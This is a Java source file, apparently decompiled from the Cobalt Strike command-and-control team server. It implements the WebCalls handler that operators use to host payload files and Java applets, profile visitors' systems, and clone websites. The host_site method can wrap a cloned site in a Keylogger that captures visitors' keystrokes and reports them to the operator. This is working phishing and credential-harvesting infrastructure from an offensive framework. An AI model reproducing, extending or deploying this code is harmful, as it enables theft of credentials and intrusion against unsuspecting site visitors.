package server;

import c2profile.Profile;
import cloudstrike.Keylogger;
import cloudstrike.ServeApplet;
import cloudstrike.ServeFile;
import cloudstrike.StaticContent;
import cloudstrike.WebServer;
import cloudstrike.WebService;
import common.CommonUtils;
import common.LoggedEvent;
import common.MudgeSanity;
import common.Reply;
import common.Request;
import common.WebEvent;
import common.WebTransforms;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import profiler.SystemProfiler;

public class WebCalls implements ServerHook, WebServer.WebListener {
    protected Map<String, WebServer> servers = new HashMap();

    protected Resources resources;

    public void register(Map map) {
        map.put("cloudstrike.host_file", this);
        map.put("cloudstrike.host_site", this);
        map.put("cloudstrike.host_data", this);
        map.put("cloudstrike.start_profiler", this);
        map.put("cloudstrike.host_applet", this);
        map.put("cloudstrike.kill_site", this);
        map.put("cloudstrike.clone_site", this);
    }

    public WebCalls(Resources resources) {
        this.resources = resources;
        broadcastSiteModel();
    }

    public List buildSiteModel() {
        LinkedList linkedList = new LinkedList();
        synchronized (this) {
            for (Map.Entry entry : this.servers.entrySet()) {
                WebServer webServer = (WebServer) entry.getValue();
                List<Map> list = webServer.sites();
                for (Map map : list) {
                    map.put("Port", entry.getKey() + "");
                    linkedList.add(map);
                }
            }
        }
        return linkedList;
    }

    public void broadcastSiteModel() {
        this.resources.broadcast("sites", buildSiteModel(), true);
    }

    public void receivedClient(String string1, String string2, Properties properties1, Properties properties2, String string3, int n, boolean bl, String string4, long l) {
        String str1 = ServerUtils.getRemoteAddress(
                ServerUtils.getProfile(this.resources), properties1);
        String str2 = properties1.get("User-Agent") + "";
        String str3 = properties2.get("id") + "";
        String str4 = properties1.get("Cookie") + "";
        this.resources.broadcast("weblog", new WebEvent(string2, string1,
                str1, str2, "unknown", string3, new HashMap<Object, Object>(properties2), string4, l, n));
    }

    public WebServer getWebServer(int n) throws IOException {
        synchronized (this) {
            if (!this.servers.containsKey(n + "")) {
                WebServer webServer1 = new WebServer(n);
                webServer1.addWebListener(this);
                webServer1.setResponseFilter(new WebTransforms(
                        ServerUtils.getProfile(this.resources)));
                this.servers.put(n + "", webServer1);
                return webServer1;
            }
            WebServer webServer = (WebServer) this.servers.get(n + "");
            if (webServer.isSSL())
                throw new IOException("Web server bound to " + n + " is SSL");
            return webServer;
        }
    }

    public WebServer getSecureWebServer(int n) throws IOException {
        return getSecureWebServer(ServerUtils.getProfile(this.resources), n);
    }

    public WebServer getSecureWebServer(Profile profile, int n) throws IOException {
        synchronized (this) {
            if (!this.servers.containsKey(n + "")) {
                WebServer webServer1 = new WebServer(n, true, profile.getSSLKeystore(),
                        profile.getSSLPassword());
                webServer1.addWebListener(this);
                webServer1.setResponseFilter(new WebTransforms(
                        ServerUtils.getProfile(this.resources)));
                this.servers.put(n + "", webServer1);
                return webServer1;
            }
            WebServer webServer = (WebServer) this.servers.get(n + "");
            if (!webServer.isSSL())
                throw new IOException("Web server bound to " + n + " is not SSL");
            return webServer;
        }
    }

    public boolean isServing(int n) {
        synchronized (this) {
            return this.servers.containsKey(n + "");
        }
    }

    public void host_file(Request request, ManageUser manageUser) {
        File file = new File(request.arg(4) + "");
        String str = request.arg(5) + "";
        if (!CommonUtils.isSafeFile(new File("uploads"), file)) {
            CommonUtils.print_error(manageUser.getNick() + " attempted to host " + file + " (unsafe)");
            manageUser.writeNow(request.reply("Failed: File '" + file + "' is not in uploads."));
            return;
        }
        if (!file.exists()) {
            manageUser.writeNow(request.reply("Failed: File '" + file + "' does not exist.\nI can't host it."));
            return;
        }
        if (!file.canRead()) {
            manageUser.writeNow(request.reply("Failed: I can't read the file. How can I serve it?"));
            return;
        }
        ServeFile serveFile = new ServeFile(file, str);
        finishWebCall2(request, manageUser, "file " + file, serveFile);
    }

    public void host_site(Request request, ManageUser manageUser) {
        String str1 = request.arg(4) + "";
        String str2 = request.arg(5) + "";
        String str3 = request.arg(6) + "";
        String str4 = request.arg(7) + "";
        if ("true".equals(str2)) {
            Keylogger keylogger = new Keylogger(str1, "text/html", str3);
            keylogger.addKeyloggerListener(new KeyloggerHandler(this.resources, str4));
            finishWebCall2(request, manageUser, "cloned site: " + str4, keylogger);
        } else {
            StaticContent staticContent = new StaticContent(str1, "text/html", str3);
            finishWebCall2(request, manageUser, "cloned site: " + str4, staticContent);
        }
    }

    public void host_data(Request request, ManageUser manageUser) {
        String str1 = request.arg(4) + "";
        String str2 = request.arg(5) + "";
        String str3 = request.arg(6) + "";
        StaticContent staticContent = new StaticContent(str1, str2, str3);
        finishWebCall2(request, manageUser, str3, staticContent);
    }

    public void host_applet(Request request, ManageUser manageUser) {
        byte[] arrby = (byte[]) request.arg(4);
        String str1 = request.arg(5) + "";
        String str2 = request.arg(6) + "";
        String str3 = request.arg(7) + "";
        ServeApplet serveApplet = new ServeApplet(arrby, str1, new byte[0], str3, str2);
        finishWebCall2(request, manageUser, str3, serveApplet);
    }

    protected void finishWebCall2(Request request, ManageUser manageUser,
                                  String string, WebService webService) {
        String str1 = request.arg(0) + "";
        int i = (Integer) request.arg(1);
        boolean bool = (Boolean) request.arg(2);
        String str2 = request.arg(3) + "";
        String str3 = bool ? "https://" : "http://";
        try {
            synchronized (this) {
                WebServer webServer = bool ? getSecureWebServer(i) : getWebServer(i);
                webServer.associate(str2, str1);
                webService.setup(webServer, str2);
            }
            manageUser.writeNow(request.reply("success"));
            broadcastSiteModel();
            this.resources.broadcast("eventlog",
                    LoggedEvent.NewSite(manageUser.getNick(), str3 + str1 + ":"
                            + i + str2, string));
        } catch (Exception exception) {
            MudgeSanity.logException(string + ": " + str2, exception, true);
            manageUser.writeNow(request.reply("Failed: " + exception.getMessage()));
        }
    }

    public void start_profiler(Request request, ManageUser manageUser) {
        String str1 = request.argz(4);
        String str2 = request.argz(5);
        String str3 = request.argz(6);
        if (str1 != null) {
            SystemProfiler systemProfiler = new SystemProfiler(str1, str3, str2);
            systemProfiler.addProfileListener(new ProfileHandler(this.resources));
            finishWebCall2(request, manageUser, "system profiler", systemProfiler);
        } else {
            SystemProfiler systemProfiler = new SystemProfiler(str3, str2);
            systemProfiler.addProfileListener(new ProfileHandler(this.resources));
            finishWebCall2(request, manageUser, "system profiler", systemProfiler);
        }
    }

    public void kill_site(Request request, ManageUser manageUser) {
        int i = Integer.parseInt(request.arg(0) + "");
        String str = request.arg(1) + "";
        deregister(i, str);
    }

    public void deregister(int n, String string) {
        synchronized (this) {
            if (!isServing(n))
                return;
            WebServer webServer = (WebServer) this.servers.get(n + "");
            if (webServer != null && webServer.deregister(string))
                this.servers.remove(n + "");
            broadcastSiteModel();
        }
    }

    public void call(Request request, ManageUser manageUser) {
        if (request.is("cloudstrike.host_file", 6)) {
            host_file(request, manageUser);
        } else if ("cloudstrike.kill_site".equals(request.getCall()) && request.size() == 2) {
            kill_site(request, manageUser);
        } else if (request.is("cloudstrike.host_data", 7)) {
            host_data(request, manageUser);
        } else if (request.is("cloudstrike.start_profiler", 7)) {
            start_profiler(request, manageUser);
        } else if (request.is("cloudstrike.clone_site", 1)) {
            new WebsiteCloneTool(request, manageUser);
        } else if (request.is("cloudstrike.host_site", 8)) {
            host_site(request, manageUser);
        } else if (request.is("cloudstrike.host_applet", 8)) {
            host_applet(request, manageUser);
        } else {
            manageUser.writeNow(new Reply("server_error", 0L, request + ": incorrect number of arguments"));
        }
    }
}
